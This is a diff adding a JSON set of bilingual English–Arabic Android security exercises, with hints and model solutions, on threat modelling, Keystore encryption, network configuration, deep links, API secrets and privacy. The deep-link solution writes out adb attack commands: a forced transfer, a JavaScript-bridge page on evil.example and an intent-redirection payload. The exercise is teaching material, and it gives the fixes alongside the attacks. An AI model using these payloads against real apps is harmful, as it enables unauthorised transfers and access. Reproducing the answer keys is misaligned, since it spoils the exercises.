@@ -1,0 +1,146 @@
+[
+  {
+    "key": "and-ex-sec-threat-model",
+    "type": "Scenario",
+    "topic": "and-sec-threats",
+    "difficulty": "Intermediate",
+    "minutes": 40,
+    "titleEn": "Threat model a habit tracker with sync",
+    "titleAr": "نموذج تهديد لمتتبع عادات مع المزامنة",
+    "problemEn": "A habit tracker stores daily habits, mood notes and optional photos, syncs to a backend, and has a paid tier unlocked by a Play purchase. Write a one-page threat model: the data flow, sensitive assets, four attacker types, at least six risks mapped to MASVS categories, a control for each, and how each control will be checked.",
+    "problemAr": "يحفظ متتبع عادات العادات اليومية وملاحظات المزاج وصورًا اختيارية، ويتزامن مع خادم، وله مستوى مدفوع يُفتح بشراء من Play. اكتب نموذج تهديد من صفحة واحدة: تدفق البيانات، والأصول الحساسة، وأربعة أنواع من المهاجمين، وستة مخاطر على الأقل مرتبطة بفئات MASVS، وضابطًا لكل منها، وطريقة التحقق من كل ضابط.",
+    "expectedEn": "A table of risks with MASVS categories, controls split between app and server, and checks such as tests, lint rules or release checklist items.",
+    "expectedAr": "جدول للمخاطر مع فئات MASVS، وضوابط موزعة بين التطبيق والخادم، وفحوصات مثل الاختبارات أو قواعد lint أو بنود قائمة فحص الإصدار.",
+    "hintsEn": [
+      "Who could benefit from unlocking the paid tier for free?",
+      "Where could mood notes leak: logs, backups, crash reports, shared storage?"
+    ],
+    "hintsAr": [
+      "من يستفيد من فتح المستوى المدفوع مجانًا؟",
+      "أين قد تتسرب ملاحظات المزاج: السجلات أم النسخ الاحتياطية أم تقارير الانهيار أم التخزين المشترك؟"
+    ],
+    "solutionEn": "Example rows: mood notes via backup (STORAGE: exclude encrypted DB, check: restore test); notes in crash reports (PRIVACY: redact, check: review SDK config); traffic on public Wi-Fi (NETWORK: HTTPS only, check: proxy test); paid tier patched (RESILIENCE plus AUTH: server verifies purchase tokens, check: backend test); other users' habits by id (AUTH: server owner check, check: API test); photos readable by other apps (PLATFORM: private storage and FileProvider, check: manifest review).",
+    "solutionAr": "أمثلة للصفوف: ملاحظات المزاج عبر النسخ الاحتياطي (‏STORAGE: استثناء قاعدة البيانات المشفرة، والتحقق: اختبار استعادة)، والملاحظات في تقارير الانهيار (‏PRIVACY: الإخفاء، والتحقق: مراجعة إعدادات SDK)، والحركة على Wi-Fi عامة (‏NETWORK: ‏HTTPS فقط، والتحقق: اختبار بوكيل)، والمستوى المدفوع المعدّل (‏RESILIENCE مع AUTH: يتحقق الخادم من رموز الشراء، والتحقق: اختبار خادم)، وعادات المستخدمين الآخرين بالمعرّف (‏AUTH: فحص المالك في الخادم، والتحقق: اختبار API)، والصور المقروءة من تطبيقات أخرى (‏PLATFORM: تخزين خاص وFileProvider، والتحقق: مراجعة الـ manifest).",
+    "runner": "None"
+  },
+  {
+    "key": "and-ex-sec-vault",
+    "type": "Practical",
+    "topic": "and-sec-keystore",
+    "difficulty": "Advanced",
+    "minutes": 60,
+    "titleEn": "A biometric-locked notes vault",
+    "titleAr": "خزنة ملاحظات مقفلة بالقياسات الحيوية",
+    "problemEn": "Build a vault screen where notes are encrypted with a Tink AEAD keyset wrapped by a Keystore master key. The vault key itself is wrapped by a second Keystore key that requires a strong biometric, so opening the vault shows BiometricPrompt with a CryptoObject. Handle devices without biometrics (password fallback), a new fingerprint invalidating the key, and lock the vault again after two minutes in the background.",
+    "problemAr": "ابنِ شاشة خزنة تُشفّر فيها الملاحظات بمجموعة مفاتيح AEAD من Tink مغلفة بمفتاح رئيسي من Keystore. ومفتاح الخزنة نفسه مغلف بمفتاح Keystore ثانٍ يشترط قياسًا حيويًا قويًا، ففتح الخزنة يعرض BiometricPrompt مع CryptoObject. وعالج الأجهزة دون قياسات حيوية (بديل كلمة المرور)، والبصمة الجديدة التي تُبطل المفتاح، وأعد قفل الخزنة بعد دقيقتين في الخلفية.",
+    "expectedEn": "Encrypted notes at rest, decryption only after a CryptoObject-backed biometric, a re-enrollment path on KeyPermanentlyInvalidatedException, and an instrumented encryption round-trip test.",
+    "expectedAr": "ملاحظات مشفرة في التخزين، وفك تشفير فقط بعد قياس حيوي مدعوم بـ CryptoObject، ومسار إعادة تسجيل عند KeyPermanentlyInvalidatedException، واختبار على الجهاز لدورة التشفير وفكه.",
+    "hintsEn": [
+      "Wrap: encrypt the vault key bytes with the biometric-bound cipher once at setup.",
+      "Use ProcessLifecycleOwner to know when the app goes to the background."
+    ],
+    "hintsAr": [
+      "التغليف: شفّر بايتات مفتاح الخزنة بالـ Cipher المرتبط بالقياس الحيوي مرة واحدة عند الإعداد.",
+      "استخدم ProcessLifecycleOwner لمعرفة متى يذهب التطبيق إلى الخلفية."
+    ],
+    "solutionEn": "Setup: create bioKey (AES-GCM, auth required, BIOMETRIC_STRONG), show BiometricPrompt with an ENCRYPT cipher, encrypt a random vault key and store iv plus ciphertext. Unlock: init a DECRYPT cipher with the stored iv, prompt, then doFinal to get the vault key and build the Aead in memory. On KeyPermanentlyInvalidatedException delete bioKey and require the account password to re-wrap. Lock by clearing the in-memory key after two minutes in the background.",
+    "solutionAr": "الإعداد: أنشئ bioKey (‏AES-GCM مع اشتراط المصادقة وBIOMETRIC_STRONG)، واعرض BiometricPrompt مع Cipher في وضع ENCRYPT، وشفّر مفتاح خزنة عشوائيًا واحفظ iv مع النص المشفر. والفتح: هيّئ Cipher في وضع DECRYPT بالـ iv المحفوظ، واعرض النافذة، ثم استدعِ doFinal للحصول على مفتاح الخزنة وابنِ Aead في الذاكرة. وعند KeyPermanentlyInvalidatedException احذف bioKey واطلب كلمة مرور الحساب لإعادة التغليف. واقفل بمسح المفتاح من الذاكرة بعد دقيقتين في الخلفية.",
+    "runner": "None"
+  },
+  {
+    "key": "and-ex-sec-network-config",
+    "type": "Practical",
+    "topic": "and-sec-network",
+    "difficulty": "Intermediate",
+    "minutes": 35,
+    "titleEn": "Lock down network traffic",
+    "titleAr": "أحكم حركة الشبكة",
+    "problemEn": "The app currently sets usesCleartextTraffic=\"true\" and its debug builds trust a proxy through a custom TrustManager that accepts everything. Replace both with a network security configuration: no cleartext in release, cleartext only to 10.0.2.2 in debug, user CAs trusted only in debug-overrides, and public-key pins with a backup and an expiry for api.example.com. Prove it works by inspecting debug traffic with mitmproxy and showing release rejects it.",
+    "problemAr": "يضبط التطبيق حاليًا usesCleartextTraffic=\"true\"، وتثق بناءات debug بوكيل عبر TrustManager مخصص يقبل كل شيء. فاستبدل الاثنين بإعدادات أمان الشبكة: لا غير مشفر في الإصدار، وغير مشفر إلى 10.0.2.2 فقط في debug، والثقة بشهادات المستخدم في debug-overrides فقط، وبصمات مفاتيح عامة مع احتياطي وتاريخ انتهاء لـ api.example.com. وأثبت أن ذلك يعمل بفحص حركة debug بـ mitmproxy وإظهار أن الإصدار يرفضها.",
+    "expectedEn": "The custom TrustManager deleted, two config files (main and debug), pins computed with openssl, and screenshots of debug interception working and release failing.",
+    "expectedAr": "حذف TrustManager المخصص، وملفا إعدادات (الرئيسي وdebug)، وبصمات محسوبة بـ openssl، ولقطات شاشة لنجاح الاعتراض في debug وفشله في الإصدار.",
+    "hintsEn": [
+      "Put the debug file in src/debug/res/xml with the same name to override.",
+      "Compute the backup pin from a key you generated but haven't deployed."
+    ],
+    "hintsAr": [
+      "ضع ملف debug في src/debug/res/xml بالاسم نفسه ليتجاوز الرئيسي.",
+      "احسب البصمة الاحتياطية من مفتاح ولّدته ولم تنشره بعد."
+    ],
+    "solutionEn": "Main config: base-config cleartextTrafficPermitted=false and a domain-config with pin-set expiration for api.example.com containing the current and backup SPKI hashes. Debug config: the same plus a domain-config allowing cleartext for 10.0.2.2 and debug-overrides trusting system and user CAs. Remove usesCleartextTraffic and the TrustManager code entirely.",
+    "solutionAr": "الإعداد الرئيسي: ‏base-config مع cleartextTrafficPermitted=false، وdomain-config مع pin-set بتاريخ انتهاء لـ api.example.com فيه بصمتا SPKI الحالية والاحتياطية. وإعداد debug: الشيء نفسه مع domain-config يسمح بغير المشفر لـ 10.0.2.2، وdebug-overrides تثق بشهادات النظام والمستخدم. واحذف usesCleartextTraffic وكود TrustManager تمامًا.",
+    "runner": "None"
+  },
+  {
+    "key": "and-ex-sec-deeplink",
+    "type": "Debugging",
+    "topic": "and-sec-components",
+    "difficulty": "Advanced",
+    "minutes": 45,
+    "titleEn": "Attack your own deep links",
+    "titleAr": "هاجم روابطك العميقة",
+    "problemEn": "The code below handles shop://transfer?to=...&amount=... and a help WebView. Using adb shell am start, show three attacks it allows (another app triggering a transfer, opening an attacker page that calls the JavaScript bridge, and an intent redirection through the next extra), then fix the code.",
+    "problemAr": "الكود أدناه يعالج shop://transfer?to=...&amount=... وWebView للمساعدة. باستخدام adb shell am start، اعرض ثلاث هجمات يسمح بها (تطبيق آخر يحفّز تحويلًا، وفتح صفحة مهاجم تستدعي جسر JavaScript، وإعادة توجيه نية عبر الإضافة next)، ثم أصلح الكود.",
+    "expectedEn": "Three working adb commands that reproduce the issues, then code that uses a verified https App Link, requires a confirmation screen with biometric for the transfer, restricts the WebView to one host without a bridge, and drops the next extra.",
+    "expectedAr": "ثلاثة أوامر adb تعيد إنتاج المشكلات، ثم كود يستخدم رابط تطبيق https متحققًا منه، ويشترط شاشة تأكيد مع قياس حيوي للتحويل، ويقيّد WebView بنطاق واحد دون جسر، ويُسقط الإضافة next.",
+    "hintsEn": [
+      "Any app can send a VIEW intent with your custom scheme.",
+      "What can a page do with window.Wallet.transfer?"
+    ],
+    "hintsAr": [
+      "أي تطبيق يستطيع إرسال نية VIEW بمخططك المخصص.",
+      "ماذا تستطيع صفحة أن تفعل بـ window.Wallet.transfer؟"
+    ],
+    "solutionEn": "Attacks: adb shell am start -a android.intent.action.VIEW -d 'shop://transfer?to=evil&amount=500'; ... -d 'shop://help?page=https://evil.example/x.html' (calls Wallet.transfer); ... --es next 'intent:#Intent;component=com.shop/.AdminActivity;end'. Fix: https App Links with autoVerify, the link only pre-fills a confirmation screen and the transfer needs a biometric-signed server request, WebView loads only help.shop.example with no addJavascriptInterface, and never parse or launch the next extra.",
+    "solutionAr": "الهجمات: ‏adb shell am start -a android.intent.action.VIEW -d 'shop://transfer?to=evil&amount=500'، ثم ... -d 'shop://help?page=https://evil.example/x.html' (يستدعي Wallet.transfer)، ثم ... --es next 'intent:#Intent;component=com.shop/.AdminActivity;end'. والإصلاح: روابط تطبيق https مع autoVerify، والرابط يملأ شاشة تأكيد مسبقًا فقط، والتحويل يحتاج طلب خادم موقعًا بالقياس الحيوي، وWebView يحمّل help.shop.example فقط دون addJavascriptInterface، ولا تحلل الإضافة next ولا تشغّلها أبدًا.",
+    "runner": "None"
+  },
+  {
+    "key": "and-ex-sec-secrets",
+    "type": "CodeReview",
+    "topic": "and-sec-code",
+    "difficulty": "Intermediate",
+    "minutes": 30,
+    "titleEn": "Review a pull request that adds a key",
+    "titleAr": "راجع طلب دمج يضيف مفتاحًا",
+    "problemEn": "A pull request adds a translation feature that calls a paid AI translation API directly from the app with the API secret in BuildConfig, disables R8 because a crash appeared in release, and adds a root check that blocks the app on rooted phones. Review it: explain each risk and propose the design you would merge.",
+    "problemAr": "يضيف طلب دمج ميزة ترجمة تستدعي واجهة ترجمة مدفوعة بالذكاء الاصطناعي مباشرة من التطبيق مع سر الواجهة في BuildConfig، ويعطّل R8 لأن انهيارًا ظهر في الإصدار، ويضيف فحص كسر حماية يمنع التطبيق على الهواتف المكسورة الحماية. راجعه: اشرح كل خطر واقترح التصميم الذي ستدمجه.",
+    "expectedEn": "Review comments covering the extractable secret, the cost and abuse risk, R8 fixed with keep rules instead of disabled, the weak root check, and a design with a backend proxy plus Play Integrity.",
+    "expectedAr": "تعليقات مراجعة تغطي السر القابل للاستخراج، وخطر الكلفة والإساءة، وإصلاح R8 بقواعد الإبقاء بدل تعطيلها، وضعف فحص كسر الحماية، وتصميمًا بوكيل في الخادم مع Play Integrity.",
+    "hintsEn": [
+      "How long until a bot scrapes the key from the Play Store APK?",
+      "What usually causes a release-only crash after enabling R8?"
+    ],
+    "hintsAr": [
+      "كم يستغرق برنامج آلي ليجمع المفتاح من ملف APK في المتجر؟",
+      "ما الذي يسبب عادة انهيارًا في الإصدار فقط بعد تفعيل R8؟"
+    ],
+    "solutionEn": "1) The secret ships in the APK and will be scraped; anyone can run up the bill. Move the call to a backend endpoint that authenticates the user, enforces per-user quotas and holds the key. 2) Disabling R8 grows the APK and exposes code; find the class reached by reflection (often a serialized DTO) from the deobfuscated stack trace and add a keep rule. 3) Root checks are trivially bypassed and block legitimate users; instead request a Play Integrity token and let the server decide, with quotas as the main protection.",
+    "solutionAr": "1) السر يُشحن في APK وسيُجمع، وأي شخص يستطيع تضخيم الفاتورة. فانقل الاستدعاء إلى نقطة في الخادم تصادق المستخدم وتفرض حصصًا لكل مستخدم وتحمل المفتاح. 2) تعطيل R8 يكبّر APK ويكشف الكود، فأوجد الصنف الذي يُصل إليه بالانعكاس (غالبًا DTO مسلسل) من تتبع الانهيار بعد فك التمويه وأضف قاعدة إبقاء. 3) فحوصات كسر الحماية تُتجاوز بسهولة وتمنع مستخدمين شرعيين، فاطلب بدلها رمز Play Integrity ودع الخادم يقرر، مع الحصص كحماية رئيسية.",
+    "runner": "None"
+  },
+  {
+    "key": "and-ex-sec-privacy",
+    "type": "Practical",
+    "topic": "and-sec-privacy",
+    "difficulty": "Intermediate",
+    "minutes": 40,
+    "titleEn": "A privacy pass before release",
+    "titleAr": "مراجعة خصوصية قبل الإصدار",
+    "problemEn": "Run a privacy pass on a sample app that requests CAMERA, READ_MEDIA_IMAGES and ACCESS_FINE_LOCATION at launch, logs request bodies, sends emails in analytics events and backs up everything. Reduce permissions with privacy-preserving APIs, make logging debug-only, redact analytics, write backup rules, add in-app account deletion and draft the Data safety answers.",
+    "problemAr": "نفّذ مراجعة خصوصية على تطبيق نموذجي يطلب CAMERA وREAD_MEDIA_IMAGES وACCESS_FINE_LOCATION عند الفتح، ويسجّل أجسام الطلبات، ويرسل البريد الإلكتروني في أحداث التحليلات، وينسخ كل شيء احتياطيًا. فقلّص الأذونات بواجهات تحافظ على الخصوصية، واجعل التسجيل في debug فقط، وأخفِ بيانات التحليلات، واكتب قواعد النسخ الاحتياطي، وأضف حذف الحساب داخل التطبيق، وصُغ إجابات Data safety.",
+    "expectedEn": "Permission prompts reduced to at most one, no personal data in release logs or analytics, backup rules excluding tokens, a delete-account flow and a short data inventory table.",
+    "expectedAr": "طلبات أذونات مقلصة إلى واحد على الأكثر، ولا بيانات شخصية في سجلات الإصدار أو التحليلات، وقواعد نسخ احتياطي تستثني الرموز، ومسار لحذف الحساب، وجدول قصير لجرد البيانات.",
+    "hintsEn": [
+      "Which of the three permissions can a system intent or picker replace?",
+      "Search the code for Log. and analytics calls with user fields."
+    ],
+    "hintsAr": [
+      "أي من الأذونات الثلاثة يمكن أن تحل محلها نية نظام أو منتقٍ؟",
+      "ابحث في الكود عن استدعاءات Log. والتحليلات التي تحمل حقول المستخدم."
+    ],
+    "solutionEn": "Replace CAMERA with ActivityResultContracts.TakePicture and READ_MEDIA_IMAGES with PickVisualMedia; ask for ACCESS_COARSE_LOCATION only on the store finder screen. Plant Timber only in debug and remove body logging in release. Wrap analytics with a redaction function. Add data_extraction_rules.xml excluding the token store and caches. Add Settings > Delete account calling the backend and clearing local data. Data inventory: email (account), coarse location (not stored), photos (user content, not shared).",
+    "solutionAr": "استبدل CAMERA بـ ActivityResultContracts.TakePicture، وREAD_MEDIA_IMAGES بـ PickVisualMedia، واطلب ACCESS_COARSE_LOCATION فقط في شاشة البحث عن المتاجر. وازرع Timber في debug فقط واحذف تسجيل الأجسام في الإصدار. وغلّف التحليلات بدالة إخفاء. وأضف data_extraction_rules.xml تستثني مخزن الرموز والذاكرة المؤقتة. وأضف «الإعدادات > حذف الحساب» يستدعي الخادم ويمسح البيانات المحلية. وجرد البيانات: البريد الإلكتروني (للحساب)، والموقع التقريبي (لا يُحفظ)، والصور (محتوى المستخدم، لا تُشارك).",
+    "runner": "None"
+  }
+]
